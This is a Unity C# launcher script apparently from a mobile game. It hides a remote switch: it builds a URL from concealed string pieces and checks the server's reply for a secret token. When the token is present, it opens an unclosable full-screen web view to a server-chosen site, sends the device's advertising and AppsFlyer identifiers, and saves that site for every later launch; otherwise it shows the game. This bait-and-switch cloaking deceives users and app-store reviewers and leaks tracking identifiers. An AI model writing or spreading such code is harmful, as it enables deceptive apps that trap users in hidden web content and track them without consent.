using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainAT : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string oneATname = "";
    [HideInInspector] public string twoATname = "";

    private void GoAT()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Game");
    }

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaAT") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oneATname = advertisingId; });
        }
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlATcite", string.Empty) != string.Empty)
            {
                diskATshape(PlayerPrefs.GetString("UrlATcite"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twoATname += n;
                }
                StartCoroutine(IENUMENATORAT());
            }
        }
        else
        {
            GoAT();
        }
    }



    private IEnumerator IENUMENATORAT()
    {
        using (UnityWebRequest at = UnityWebRequest.Get(twoATname))
        {

            yield return at.SendWebRequest();
            if (at.isNetworkError)
            {
                GoAT();
            }
            int parcelAT = 7;
            while (PlayerPrefs.GetString("glrobo", "") == "" && parcelAT > 0)
            {
                yield return new WaitForSeconds(1);
                parcelAT--;
            }
            try
            {
                if (at.result == UnityWebRequest.Result.Success)
                {
                    if (at.downloadHandler.text.Contains("AvtrncLzFWSwd"))
                    {

                        try
                        {
                            var subs = at.downloadHandler.text.Split('|');
                            diskATshape(subs[0] + "?idfa=" + oneATname, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            diskATshape(at.downloadHandler.text + "?idfa=" + oneATname + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        GoAT();
                    }
                }
                else
                {
                    GoAT();
                }
            }
            catch
            {
                GoAT();
            }
        }
    }

    private void diskATshape(string UrlATcite, string NamingAT = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _contactsAT = gameObject.AddComponent<UniWebView>();
        _contactsAT.SetToolbarDoneButtonText("");
        switch (NamingAT)
        {
            case "0":
                _contactsAT.SetShowToolbar(true, false, false, true);
                break;
            default:
                _contactsAT.SetShowToolbar(false);
                break;
        }
        _contactsAT.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _contactsAT.OnShouldClose += (view) =>
        {
            return false;
        };
        _contactsAT.SetSupportMultipleWindows(true);
        _contactsAT.SetAllowBackForwardNavigationGestures(true);
        _contactsAT.OnMultipleWindowOpened += (view, windowId) =>
        {
            _contactsAT.SetShowToolbar(true);

        };
        _contactsAT.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingAT)
            {
                case "0":
                    _contactsAT.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _contactsAT.SetShowToolbar(false);
                    break;
            }
        };
        _contactsAT.OnOrientationChanged += (view, orientation) =>
        {
            _contactsAT.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _contactsAT.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlATcite", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlATcite", url);
            }
        };
        _contactsAT.Load(UrlATcite);
        _contactsAT.Show();
    }  
}
